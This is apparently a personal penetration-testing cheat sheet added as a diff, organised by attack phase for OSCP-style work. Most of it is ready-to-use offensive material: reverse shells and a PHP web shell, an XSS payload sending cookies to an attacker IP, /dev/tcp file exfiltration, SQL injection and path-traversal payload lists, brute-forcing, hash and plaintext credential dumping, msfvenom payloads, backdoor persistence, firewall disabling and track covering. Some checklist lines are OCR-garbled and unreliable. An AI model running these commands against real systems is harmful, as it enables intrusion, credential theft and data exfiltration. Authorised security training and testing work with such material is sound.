@@ -1,0 +1,1193 @@
+[+] Reconnaissance [+]
+
+Passive information gathering; from the customer, from the web, from hardware we can see, public facing web resources, phone calls, social engineering
+-Google   (basic site, site crawling, “google-dorking” for documents and other files)
+-Download documents and pull names
+-Social Media (facebook, LinkedIn)
+-Job postings
+-Business partners or contractors
+-press releases or local media
+-exec bios
+-SSL certificate names
+-advertising
+-employee database (common with Government)
+-maps
+-WayBack Machine https://archive.org/web/ 
+-Netcraft
+-Shodan
+-maltego
+-recon-ng
+spiderfoot
+-xf tools to find metadata in documents, like author of pdf’s, .docx’s, etc
+
+Google dorks:
+"site:"
+"filetype:"
+"link:"
+"intitle:"
+"inurl"
+"define:"
+"book:"
+
+    intext: passwords filetype: txt
+    mysql history files
+    intext: account details filetype: txt
+    intitle:index.of intext:”secring .skr”|&q…
+    people.lst
+    passwd
+    master.passwd
+    pwd.db
+    htpasswd / htpasswd.bak
+    htpasswd / htgroup
+    spwd.db / passwd
+    passwd / etc (reliable)
+    config.php
+    passlist
+
+
+DNS
+whois ---- domain registration information available from ARIN
+nslookup
+dig	(dig www.google.com @8.8.8.8) (dig -x 130.207.160.175 {reverse lookup}   dig zonetransfer.me any)
+dig -t AXFR 560gc.tgt @10.11.11.24
+dig axfr @nstm1.digi.ninja zonetransfer.me
+DNSrecon tool
+DNSenum tool
+dnsrecon -d megacorpone.com -t axfr  (zone transfer)
+map public network
+zone transfer ---- transfer everything from primary to backup, in our case, we are the “backup”
+mx records ---- mail
+A records ---- IP addresses
+Identifiy available services, possible entry points
+PTR
+CNAME
+TXT
+AAAA ---- IPv6
+reverse DNS lookup
+/etc/resolv.conf     ----- local dns info
+recon-ng
+host www.megacorpone.com
+host -t ns [megacorpone.com]     (get name servers)
+host -l megacorpone.com ns2.megacorpone.com  (zone transfer)
+
+bash script for dns zone transfer attempts:
+#!/bin/bash
+# $1 is the first argument given after the bash script
+
+for nameserver in $(host -t ns $1 | cut -d" " -f 4 | sed 's/.$//');do
+    host -l $1 $nameserver | grep "has address"
+done
+
+
+dnsdumpster.com
+shodan
+hackertarget
+truffleHog (scour github for passwords, secret keys, ssh creds, etc)
+
+
+
+
+Social Engineering
+
+
+Phishing tools
+-Gophish
+-Social Engineering Toolkit
+
+https://www.reddit.com/r/Pentesting/comments/9ondj5/a_good_pentesting_tools_list/ 
+
+
+
+
+[+] Scanning/Enumeration [+]
+
+Run this first to update script.db (if you add any scripts from online):
+nmap --script-updatedb
+
+    nmap
+    -A (“kitchen sink”)
+    -O (os fingerprinting)
+    -sV (service version detect)
+    --version-all (try all probes)
+    -sS (SYN “half open” scan)
+    -sT (TCP scan)
+    -sU (UDP scan)
+    -v (verbose output)
+    --open (only display open)
+    --top-ports=1000
+    --reason (show reason)
+
+    NSE scripts
+    --script=banner (ban grabs)
+    -sC (all scans in default cat.)
+    /usr/share/nmap/scripts
+    --script=[script.nse]
+    --script=smb-vuln-* (all smb scripts for vulns)
+    --script-args vulns.showall
+
+    -oN (normal nmap output)
+    -oG (grep-able)
+    -oX (xml) include –webxml
+
+(zenmap can do a graphical network map output if you import the nmap scan)
+
+“nmap-service-probes” shows how version checking
+
+
+basic ping/icmp sweep
+nmap -sn 192.168.0.0/24   (super quick, not detailed)
+
+broad: (sweep network)
+nmap -sT --top-ports 100 -iL icmp_sweep.txt -oG [initialnetscan.gnmap] [targetIPs]
+
+certain ports (example, smb)
+nmap -p139,445 192.168.31.1-254 --open
+
+detailed host scans:
+nmap -v -sV -O -A --script=banner -p 0-65535 --webxml -oX [IPforfilename.nmap] [target] 
+nmap -v -sV -O --top-ports=2000 -T4 [targetIP]
+nmap -v -A -O -sV -sC -p [ports] [target]
+nmap --script vuln [target]  (runs all scripts in vulnerabilities category)
+nmap -v -p 80 --script all 192.168.0.5  (all NSE scripts, could take over an hour)
+
+
+banner grab with netcat:  nc -nv [port]
+banner grab with telnet
+banner grab wit ncat: ncat -C 
+
+banner grabbing
+
+nc [targetIP] 80
+HEAD / HTTP/1.0
+
+nc [targetIP] 80
+GET / HTTP/1.0
+
+Smtp
+HELP	
+
+pop3
+USER bob
+PASS bob
+			
+
+Web stuff!!
+whatweb
+Nikto
+wpscan
+dirb
+dirbuster 
+recon-ng
+curl -k
+wget
+gobuster -u http://10.11.1.71 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
+http PUT access:   
+cadaver http://target:8080/dav
+dav:/dav/> put /tmp/shell.php         (or whatever language of shell)
+OR      nmap -p 80 192.168.1.4 –script http-put –script-args http-put.url=’/dav/nmap.php’,http-put.file=’/root/Desktop/nmap.php’
+
+File upload bypasses:
+http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html
+https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf 
+
+pentest-monkey webshells 
+some are included with kali
+
+<?php echo system($_GET["cmd"]); ?>
+
+
+SMB enumeration
+
+enum4linux -v [targetIP]       (figure out smb version, etc) (usually needs null session enabled)
+
+msf > use auxiliary/scanner/smb/smb_version
+
+nbtscan 192.168.0.1-254
+rpcclient -U “” [targetIP]   (enter empty password, start null session on smb1)
+srvinfo	enumdomusers	getdominfo	help			
+
+net use \\[target]\[share] [password] /u:[user]
+
+
+SMB null session on Windows:  
+net use \\[target] "" /u:""
+
+smbmap -H [targetIP]
+
+smbclient -L 10.10.0.1 -U [user]
+
+
+rpcclient -U [user] [targetIP]
+$>help
+$>enumdomusers
+$>srvinfo
+$>enumalsgroups domain
+$>enumalsgroups builtin
+$>queryuser 500
+$>
+$> lookupnames administrator
+$> lookupnames administrators
+
+C:\> net use
+C:\> net session
+C:\> net session \\[IP] /del /y     (cleanup)
+
+ls -l /usr/share/nmap/scripts/ | grep smb
+nmap -v -p 139,145 -oN smbenum.txt 10.11.1.1-254
+nmap -v -p 139,445 –script smb-enum-users [targetIP]
+
+check out smb vuln scripts in /usr/share/nmap/scripts/smb*
+nmap -v -p 139,445 --script=smb-vuln-* [target]     (run all smb vuln scripts)
+
+    Ref:
+    SMB1 – Win2000/XP/WinServ03
+    SMB2 – WinVistaSP1/WInServ08
+    SMB2.1 – Win7/WinServ08R2
+    SMB3 – Win8/WinServ12
+
+
+
+OS discovery
+nmap –script smb-os-discovery.nse –script-args=unsafe=1 -p 139,445  [host]
+enumerate users
+nmap –script smb-enum-users.nse –script-args=unsafe=1 -p 139,445 [host] 
+
+SMTP enumeration (port 25 default)
+
+nc -nv 10.xx.xx.xx 25
+VRFY root
+EXPN root
+
+
+SNMP enumeration
+snmp-check 10.x.x.x
+
+nmap -SU --open -p 161 192.168.0.5-100 –open 
+nmap -sU --open -p 161 10.11.1.1-254 -oG mega-snmp.txt
+or
+root@kali:~# echo public > community
+root@kali:~# echo private >> community
+root@kali:~# echo manager >> community
+root@kali:~# for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
+root@kali:~# onesixtyone -c community -i ips
+
+msf> use auxiliary/scanner/snmp/snmp_enum
+
+tool: snmpwalk
+
+    Windows SNMP Ref
+    1.3.6.1.2.1.25.1.6.0    System Processes
+    1.3.6.1.2.1.25.4.2.1.2  Running Programs
+    1.3.6.1.2.1.25.4.2.1.4  Processes Path
+    1.3.6.1.2.1.25.2.3.1.4  Storage Units
+    1.3.6.1.2.1.25.6.3.1.2  Software Name
+    1.3.6.1.4.1.77.1.2.25   User Accounts
+    1.3.6.1.2.1.6.13.1.3    TCP Local Ports
+
+
+
+
+
+RDP brute-forcing
+ncrack -vv –user Administrator -P /tmp/passwords.txt rdp://10.xx.xx.xx
+(hydra is not so stable for RDP protocol)
+
+
+Graphical/Web Tools:
+OpenVAS
+open-vas setup    (make sure to copy password generated)
+openvas start
+browse to http://127.0.0.1:9392/  (admin, paste the pass)
+
+
+FTP
+ftp [ip]
+Anonymous login allowed?       anonymous / guest
+Set upload to binary (cmd is binary) when uploading or downloading files
+put /tmp/rootshell.exe rootshell.exe    (or webshell into wwwroot, etc)
+get flag.txt                  (download)
+https://www.poftut.com/how-to-use-ftp-server-from-command-line-tutorial-with-examples/ 
+proftpd?      USER %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --   (bypass login)
+
+nmap -p 21 -sV –script=ftp* xxx.xxx.xxx.xxx
+
+
+SQL
+
+sqlmap -u “http://XX.XX.XX.XX/app.php” -b --random-agent --fresh-queries (--dump-all)
+
+mysqldump --user=root --password=[pass] --host=[ip] --port=[port] --all-databases  
+
+
+**NoSQLMap Examples**
+You may encounter NoSQL instances like MongoDB in your OSCP journey (`/cgi-bin/mongo/2.2.3/dbparse.py`).  NoSQLMap can help you to automate NoSQLDatabase enumeration.
+  -   NoSQLMap Installation
+            git clone https://github.com/codingo/NoSQLMap.git
+            cd NoSQLMap/
+            ls
+            pip install couchdb
+            pip install pbkdf2
+            pip install ipcalc
+            python nosqlmap.py --help
+mssql_exec (msf module, can be done manually)   EXEC master..xp_cmdshell ‘\\[IP]\tmpshare\shell.exe’
+
+Exampl
+
+RPC and abusing NFS shares:
+apt-get install rpcbind && apt-get install nfs-common
+rpcinfo -s 192.168.21.53
+showmount -e 192.168.21.53
+/backup *                      <----cool, mount this and see whats inside
+mount -t nfs 192.168.23.128:/backup /tmp/nfs -o nolock  (copy the files you find in there)
+
+
+
+
+
+ 
+[+] Exploitation / Gain Access [+] 
+
+sniffer: (always use when throwing data at target, to see the packets real time)
+tcpdump -n -v -i [interface] host 10.XX.XX.XX
+
+top with iptables for monitoring tunnels 
+
+netstat -antup (check for listening/established connections (tcp) )
+netstat -s  (stats by protocol)
+
+exploit options:
+searchsploit
+Metasploit
+exploit-db
+Scripts
+shady sites
+Manually 
+
+First time metaploit?
+msfdb init         (initialize database)
+sudo msfconsole -q
+msf > db_rebuild_cache
+msf > [exploit keywords!!!]
+msf > search port:445 type:exploit os:windows    <----- great way to search
+
+msf > show options
+msf > show advanced
+msf > search type:exploits psexec
+
+
+SSH:
+Bruteforcing (come up with username list from enumeration, use wordlists for common pass)
+hydra -e nsr -V -F -t 4 -u -L /root/userlist-pumpkin.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.131:22
+
+
+Shells
+shell cheatsheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+/bin/bash -i >& /dev/tcp/10.11.0.73/443 0>&1
+
+Shell breakouts: 
+(https://netsec.ws/?p=337) 
+(https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)
+python -c 'import pty; pty.spawn("/bin/bash")'
+echo os.system('/bin/bash')
+/bin/sh -i
+perl -e 'exec "/bin/sh";'
+lua: os.execute('/bin/sh')
+export PATH=/bin:/usr/bin:$PATH
+export SHELL=/bin/sh
+
+
+get command shell (reverse or bind): 
+./psexec.py [user]:[password]@[10.XX.XX.XX] cmd.exe  (if Windows with SMB is enabled, with creds)
+https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/ 
+
+(if Windows, and you can run code on the server in memory from attacking box)
+smbserver
+
+nc -nvlp 4444 xx.xx.xx.xx -e /bin/bash        (cmd.exe on Windows, get linux bash shell)
+
+listener to give cmd shell
+nc -l -p 4444 -e cmd.exe     (can use -L in windows for persistent listener)
+
+<?php echo shell_exec ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacking IP port >/tmp/f');?>
+
+use pentest-monkey premade ones
+https://krypted.com/utilities/html-encoding-reference/       may have to escape characters, such as & == %26
+https://meyerweb.com/eric/tools/dencoder/ 
+
+Web form Bruteforcing
+general hydra syntax:   hydra [ip] [form: <url>:<form parameters>:<failure string>:Cookie]
+Example with hydra on web application:
+hydra -l root -P /tmp/39pass.txt -f -V 'http-post-form://10.11.1.39/otrs/index.pl:User=^USER^&Password=^PASS^:Login failed'
+(will look for any post response that doesn’t contain “Login Failed”, using username root and a password file)
+
+different example:
+hydra -V -F -e nsr -l admin -P /usr/share/wordlists/rockyou.txt 10.11.12.9 -s 8585 http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR:"
+
+with cookies:
+hydra 10.11.1.250 -t 2 -l admin -P /usr/share/wordlists/rockyou.txt http-get-form "/dvwa/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low;PHPSESSID=409e45633a8281adb8f182021cfacd14" 
+
+Use  -u to loop around your list of users (-L), not passwords <-- always use if using a list of users, along with -e nsr for common permutations
+
+XSS
+Browser redirection in an iframe:
+<iframe SRC="http://10.11.0.5/report" height = "0" width ="0"></iframe>
+get a php authenticated cookie (open a listener up on attacker, nc -nlvp 80):
+<script>new Image().src="http://10.11.0.5/bogus.php?output="+document.cookie;</script>
+
+LFI
+Look for weblinks/scripts that take filenames as parameters (unsanitized user input)
+example: http://vulnerable_host/preview.php?file=example.html
+replace: http://vulnerable_host/preview.php?file=../../../../etc/passwd
+
+place characters in URLs that aren't typically allowed: encoding is a percent sign followed by an ASCII value (in hexadecimal). So %20 is a space, %30 is the number 0, %3b is semicolon and so on
+
+you may need to put a null byte at the end to escape some filtering, %00
+
+../
+..\
+..\/
+%2e%2e%2f
+%252e%252e%252f
+%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215
+%uff0e%uff0e%u2216
+..././
+...\.\
+
+Dirs to check for:
+Linux
+/etc/passwd
+/etc/shadow
+/etc/issue
+/etc/group
+/etc/hostname
+Linux Log files
+The following files are log files found on Linux systems:
+Apache access log: /var/log/apache/access.log
+Apache access log: /var/log/apache2/access.log
+Apache access log: /var/log/httpd/access_log
+Apache error log: /var/log/apache/error.log
+Apache error log: /var/log/apache2/error.log
+Apache error log: /var/log/httpd/error_log
+General messages and system related entries: /var/log/messages
+Cron logs: /var/log/cron.log
+Authentication logs: /var/log/secure or /var/log/auth.log
+
+CMS/web configuration files
+The following files are configuration files for popular content management systems. When a target is running any of these CMS systems you can try to include their configuration files as they often contain sensitive information, such as (root) credentials used to access the database.
+WordPress: /var/www/html/wp-config.php
+Joomla: /var/www/configuration.php
+Dolphin CMS: /var/www/html/inc/header.inc.php
+Drupal: /var/www/html/sites/default/settings.php
+Mambo: /var/www/configuration.php
+PHPNuke: /var/www/config.php
+PHPbb: /var/www/config.php
+
+Windows
+To verify LFI on Windows systems a very common file we can attempt to include is the hosts file in the following directory:
+C:/windows/System32/drivers/etc/hosts
+The following files of interest can (sometimes) be found on Windows systems which may contain passwords and other sensitive information:
+C:/Windows/Panther/Unattend/Unattended.xml
+C:/Windows/Panther/Unattended.xml
+C:/Windows/Panther/Unattend.txt
+C:/Unattend.xml
+C:/Autounattend.xml
+C:/Windows/system32/sysprep
+
+C:/inetpub/wwwroot/
+C:/inetpub/wwwroot/web.config
+C:/inetpub/logs/logfiles/
+
+C:/documents and settings/administrator/desktop/desktop.ini
+C:/documents and settings/administrator/ntuser.dat
+C:/documents and settings/administrator/ntuser.ini
+C:/users/administrator/desktop/desktop.ini
+C:/users/administrator/ntuser.dat
+C:/users/administrator/ntuser.ini
+C:/windows/windowsupdate.log
+XAMPP(windows)
+C:/xampp/apache/conf/httpd.conf
+C:/xampp/security/webdav.htpasswd
+C:/xampp/apache/logs/access.log
+C:/xampp/apache/logs/error.log
+C:/xampp/tomcat/conf/tomcat-users.xml
+C:/xampp/tomcat/conf/web.xml
+C:/xampp/webalizer/webalizer.conf
+C:/xampp/webdav/webdav.txt
+C:/xampp/apache/bin/php.ini
+C:/xampp/apache/conf/httpd.conf
+
+
+RFI  
+example     https://victim/vulnpath=http://attacker-ip/script.php
+point back to attacking box and execute code
+
+
+SQLi (SQL injection)
+‘
+admin' --
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+
+
+Buffer overflows: (less likely, but hey maybe)   (ASLR and DEP are not your friend)
+Dostackbufferoverflowgood (google it, learn)
+OSCP practicing with debugger
+
+
+
+
+Some common reliable exploits to remember:
+ms17_010 (eternalblue, smb windows vuln older versions)
+tomcat_mgr_upload (requires creds, can often be found after initial exploit in xml file on server)
+linux kernel exploits 
+
+ 
+[+] Post-Exploitation: [+] 
+Data Exfiltration/Creds/C2/Persistence 
+
+Metasploit
+meterpreter > help      (use to see all commands available)         
+https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/ 
+meterpreter > pwd        (present working directory)
+meterpreter > getuid
+meterpreter > ifconfig
+meterpreter > sysinfo
+meterpreter > idletime
+
+migration
+meterpreter > getpid
+meterpreter > ps    (choose a clandestine service PID with root/SYSTEM privileges)
+meterpreter > migrate [PID]
+meterpreter > kill [PID]
+
+priv escalation
+meterpreter > use priv
+meterpreter > getsystem
+(look into udev or rds)
+meterpreter > run post/
+meterpreter > use exploit/windows/local/bypassuac (Win7+)
+
+creds
+msf> run post/windows/gather/hashdump
+meterpreter > hashdump (pulls from memory)
+meterpreter > run hashdump (pulls from disk)
+look for backup copies of SAM database under C:/windows/repair, or C:/windows/backup
+
+copy /etc/passwd and /etc/shadow if *nix	
+
+meterpeter> use kiwi
+meterpreter> creds_all      (pull plaintext creds out of memory)
+meterpeter> msv
+meterpeter> Kerberos
+meterpeter> wdigest (kiwi command for older systems)
+meterpreter> load mimikatz
+meterpreter> mimikatz_command -f samdump::hashes
+LANMAN? Easy to crack
+NTLM? If you can get hashes, pass-the-hash!
+Net-NTLM? Can’t pass the hash
+Active Directory on a domain? Start running Responder - LLMNR/NBT-NS/MDNS poisoner - 
+Linux: watch for Salts depending on distro
+
+
+meterpreter > enumdesktops
+
+meterpreter > search -f *proof*.txt
+meterpreter > search -f *network-secret*.txt
+meterpreter > cat proof.txt
+
+meterpreter > cd    (change directories and search around)
+meterpreter: upload, download, cat, edit
+remember to use forward slashes (/) in file system paths (even in Windows)
+
+meterpreter > shell 
+
+meterpreter > background
+msf exploit(msXX_XXX_xxxxxx) > sessions -l
+msf exploit(msXX_XXX_xxxxxx) > sessions -i 1
+
+Find flags in OSCP: 
+meterpreter > search -f *proof*.txt
+meterpreter > search -f *network-secret*.txt
+
+uictl disable mouse
+uictl disable keyboard
+uictl enable all
+
+execute [notpad.exe]           (-H will do hidden, -i to interact, -m to execute from memory)
+
+use exploit/windows/…… inject_payload   (send another payload, such as 64 bit)
+
+metsvc -A  (install meterpreter as a service)
+
+ls /Metasploit-latest/scripts/meterpreter/*    (see all, edit them for your own custom stuff)
+
+
+Get a Windows GUI
+Metasploit: use post/windows/manage/enable_rdp     (enable rdp and make a new user, requires system privs) or you can do manually via cmd or powershell (below)
+
+
+
+
+Abusing SSH:
+http://pentestmonkey.net/cheat-sheet/ssh-cheat-sheet 
+
+ssh-keygen -f mykey -t rsa -b 768   (generate new public and private key pair)
+(copy the public key onto the target, add it to   /home/tgtuser/.ssh/authorized_keys  as a new line)
+ssh -i mykey user@10.xx.xx.xx    (make sure the same user you dropped public key in)
+
+
+SCP
+scp -r username@from_host:/remote/directory/  /local/directory/       (secure copy from target to yours)
+scp file.txt username@to_host:/remote/directory/      (copy from local box to target)
+
+
+Web servers are your friend!
+python3 -m http.server 9000    (or try –help for options)
+legacy:    python -m SimpleHTTPServer 8000
+wget -r --no-parent http://10.25.3.92    (pull down entire contents of web server)
+wget https://10.x.x.x/file.exe --no-check-certificate
+curl
+
+
+
+netcat shells (backdoor):
+win:  nc -nlvp 4444  -e cmd.exe  (nc -nvp [IP] 4444)
+*nix:  nc -nlvp 4444 -e /bin/bash  (nc -nvp [IP] 4444)
+
+netcat relay box (middle man who may not be blocked from firewall in front of victim)
+victim: nc -nlvp 4444 -e [shell or cmd.exe]
+relay: mknod fifo p  
+           nc -lp 4444 0<fifo | nc [NEXT_HOP_IP] 4444 1>fifo
+attacker:
+nc -nv [RELAY_IP] 4444
+
+netcat relay on versions without -e:
+mknod fifo p
+/bin/sh 0<fifo | nc -lp 4444 1>fifo
+
+exfiltrate file with netcat:
+nc -nv 10.xx.xx.xx 4444 </opt/secretfiles/nc.exe
+nc -nlvp 4444 > incoming.exe
+
+echo “while :; do echo “Started”; /etc/initd/nc -l -p 8080 -e /bin/sh; done” > sneaky.sh
+nohup ./sneaky.sh      (run the script, nohup bypasses any errors and runs even after the user terminal closes)
+
+
+Linux Commands/dirs
+id	uname -a	whoami	ls	who	w	last 
+arch	ifconfig or /sbin/ifconfig -a	uname -a (find kernel ver for priv esc)	netstat -antup	lsof -i lsof -p [pid]	Systemctl [start/stop] [ssh, apache2, ]	df h
+uname -mrs	cat /proc/version	Dmesg | grep linux	rpm -q kernel	ls /boot | grep vmlinuz-	cat /etc/issue	cat /etc/*-release
+set	cat /etc/profile	cat /etc/bashrc	env	cat ~./bash_profile	cat ~./bashrc	cat ~/.bashlogout 
+/etc/passwd	/etc/shadow	/etc/group	ip a			
+ps aux	ps -elf | grep root	top		cat /etc/services		cat /etc/fstab
+/bin	/sbin	/usr/bin	/usr/sbin	/usr/local/bin	/opt	/tmp
+ls /etc/init.d	systemctl list-unit-files |grep enabled	cat /etc/ rc.local	cat /etc/cron*	ls -lisha /var/spool/cron	Ls -al /etc/ | grep cron	crontab -l 
+cat /etc/resolv.conf	cat /etc/sysconfig/network	Iptables -L	Hostname	dnsdomainname	route	
+
+Look for adm, wheel, sudo groups – in larger networks, groups named after organizational groups
+
+find / -name proof.txt    (look for file itself)
+
+find / -type f -exec grep -Iq "proof.txt" {} \; -and -print (recursive grep for ASCII keywords in all files/dirs)
+
+copy+paste (can base64 encode it first if you want)
+/dev/tcp (raw tcp connection)
+cat /etc/passwd > /dev/tcp/x.x.x.x/443    (catch it with a listener on 443)
+
+
+
+**Windows Commands
+dir	ver	systeminfo	set username	set userdomain	net localgroup administrators
+set					Uname -m (show 32/64 bit)
+whoami (win7+)	net user	net localgroup	net view	runas	wmic logicaldisk get [caption], [description], [providername]
+ipconfig /all	netsh	arp -a	net share	tasklist	netstat -n -a -o
+wmic os get osarchitecture	ping 	tracert	nslookup	arp	netsh advfirewall firewall show rule name=all more
+find	mkdir	move	path		type (like cat in unix)
+attrib	date	copy	del		netstat -ano
+
+
+Turn off Windows Firewall:
+NetSh Advfirewall set allprofiles state off
+
+https://github.com/maaaaz/impacket-examples-windows 
+
+dir /b /s *proof*
+
+
+windows: netstat -ano, arp -a, ipconfig /displaydns
+linux: netstat -antup, arp -a
+both: netstat -nr                                      web servers, mail servers, dns servers
+
+
+Windows:
+dir /s /b c:/readme.txt         (/s recursive, /b ….)
+net user (shows user accounts)
+net localgroup admin (show admins)
+net user [demouser] [pass] /add
+net localgroup administrators [demouser] /add (add your new account as admin)
+net localgroup "Remote Desktop Users" [user] /add   (allow them rdp)
+net localgroup administrators [demouser] /del (cleanup)
+net user [demouser] /del (cleanup pt 2)
+netsh advfirewall show all profiles     (shoe firewall stuff)
+netsh advfirewall firewall add rule name="allow 23" dir=in action=allow remoteip=xx.xx.xx.xx protocol=tcp localport=23  (punch a whole in firewall allowing telnet)
+netsh advfirewall firewall del rule name="allow 23"
+reg query HKLM\System
+reg add HKLM Test123 /v blah /t REG_SZ /d thisisdata
+reg export HKLM\Software software.reg
+reg query \\10.10.10.10\HKLM  (do this to do it remotely, need admin creds)
+net use \\10.10.10.10 passwor8 /u:susan    (remember sometimes need hostname)
+net use * /del /y   (for covering tracks)
+sc query   (show all services, running and stopped)
+runas /u:fred cmd.exe       (run a cmd prompt as user fred)
+^G       (aweful annoying beep, put in a loop)
+
+schtasks /create /tn [taskname] /s [targetIP] /u [user] /p [password] /sc [frequency] /st [starttime] /sd [startdate] /tr [command]
+
+psexec \\[targetIP] -d -u [user] -p [password] [command]   if you don’t put user and pass, will use creds from acount you are currently on) (-d makes it hidden in background)
+must have smb access of target; must have admin creds
+
+cipher /w:[file]         (writes all zeros, then all 1s (0xFF), then random numbers, over location in memory)
+
+look this up:
+windows-exploit-suggester.py
+
+
+Linux add sudo user 
+adduser bill   (set password at prompt)
+echo 'bill:badpassword'|chpasswd  (if you need non-interactive – or try)  
+usermod --password [PASSWORD] [USERNAME]    
+usermod -aG sudo bill           (add as sudo user)
+
+CentOS add sudo user
+adduser bill
+passwd bill
+usermod -aG wheel bill
+
+Windows add administrator user:
+net user /add [username] [password]
+net localgroup administrators [username] /add
+net localgroup “Remote Desktop Users” [domain*optional*]\[username] /add   (if you want RDP)
+
+Enable RDP: 
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+Disable RDP: 
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=No
+
+
+rdesktop [targetip]
+
+xfreerdp /size:1024x768 /cert-ignore /v:10.12.1.124:3389 /u:username              (better! Handles more security stuff)
+
+
+
+
+C2 with meterpreter: Custom shells
+Windows:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On]
+-f exe -o met_win_tcp_reverse.exe
+(try win reverse https)
+Linux:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f elf > shell.elf
+msfvenom --platform linux -p linux/x86/shell_reverse_tcp LHOST=192.168.253.133 LPORT=443 -f c -b “\x00\x0a\x0d\x20” -e x86/shikata_ga_nai
+Mac:
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f macho > shell.macho
+WAR with apache tomcat:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+new msfvenom commands and uses:
+https://forums.offensive-security.com/showthread.php?t=3215 
+Metasploit custom payloads of all kinds:
+https://netsec.ws/?p=331 
+
+Catch incoming connection with:                msf > use exploit/multi/handler
+msf exploit(handler) > set PAYLOAD windows/meterpreter/[your payload]
+show options
+set LHOST, LPORT, and exploitnate tip: msfvenom
+new payload needs to be shorter, and add no-ops/blank bits? to make payload match original length
+
+use Metasploit payloads for reverse TCP or BIND shell (reverse preferred, BIND only if necessary, will poke hole in victim’s firewall)
+
+
+Web:
+
+Web url encoding: https://www.w3schools.com/tags/ref_urlencode.asp 
+
+Webshells:
+
+ASP
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.136 LPORT=53 -f asp -o shell.asp
+
+PHP
+root@kal:/tmp# msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.1.229 LPORT=53 -f raw -o shell.php
+***Make sure to add    ?php and ?> in to msfvenom.php file (beginning and end respective)***
+
+https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp
+
+weevely generate password1234 shell.php      (upload this obfuscated webshell)
+(then run) weevely http://xx.xx.xx.xx/app/uploads/shell.php    (enjoy your shell!)
+
+
+OSCP post-exp checklists:
+        **Win:
+        date /t
+        time/t
+        hostname
+        whoa mi (or echo %usemame%)
+        ipconfig
+        dir
+        type proof.txt
+        type network-secret.txt
+        systeminfo
+        net users
+        net localgroup administrators
+        ipconfig -al I
+        route print
+        arp -a
+        netstat -ano
+        t asklist /svc
+        net start
+        net sha r,e
+        net use
+
+        **Lin:
+        date
+        whoami
+        id
+        hostname
+        /sbin/ifoo nfig
+        pwd
+        Is -I
+        cait proof. txt
+        cat network-secret.txt
+        cat / etc/issue
+        uname -ai
+        cat / etc/p,asswd
+        cait / etc/group
+        cat/ etc/ shadow
+        cat / etc/ sudoers
+        Is -a lh /va r/mail/
+        Is -a hlR / mot/
+        Is -ah lR /home/
+        who
+        w
+        llast
+        /sbin/ifoonfig ~a
+        cat / etc/network/inte rfaoes (or cat
+        / etc/sysco nfig/ network)
+        arp -e
+        /sbin/route -nee
+        psaux
+        ps -ef
+        cait / etc/services
+
+
+
+ 
+[+] Privilege Escalation [+] 
+Enumerate as much as you can! Then,
+
+Windows:
+http://www.fuzzysecurity.com/tutorials/16.html 
+https://github.com/pentestmonkey/windows-privesc-check/ 
+https://github.com/411Hall/JAWS/ 
+-Check net user and admin and user rights
+-Is there powershell? try powerup.ps1, sherlock.ps1 and JAWS.ps1.
+-Do you have meterpreter? load kiwi, try bypass UAC, check SAM SYSTEM etc.
+getsystem
+kiwi – creds_kerberos       creds_all   
+-check for weird programs or non-standard registry keys
+
+Linux:
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
+
+Scripts to automate:
+LinEnum     ./LinEnum.sh -e /tmp/export.txt
+lse.sh                           ./lse.sh            ./lse.sh -l1   ./lse.l2
+linuxprivchecker.py
+linux-exploit-suggester.sh
+unix-privesc-check.sh
